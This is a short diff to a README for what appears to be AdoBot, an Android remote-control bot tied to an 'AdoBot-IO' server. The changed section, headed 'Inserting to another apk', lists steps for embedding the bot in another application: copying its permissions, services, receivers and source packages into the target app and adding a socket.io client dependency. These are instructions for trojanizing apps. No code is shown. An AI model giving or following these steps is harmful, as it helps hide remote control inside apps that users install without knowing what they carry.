@@ -12,6 +12,7 @@ Change it to the address of your [AdoBot-IO](https://github.com/adonespitogo/Ado
 
 # Inserting to another apk
 
- - Copy the permissions in the manifest file 
- - Copy the source packages to another apk source
+ - Copy the permissions in the manifest file to the target apk source
+ - Copy the services and receivers in the manifest file to the target apk source
+ - Copy the source packages to the target apk source
  - Add `compile 'io.socket:socket.io-client:0.8.3'` to the target project's module gradle file
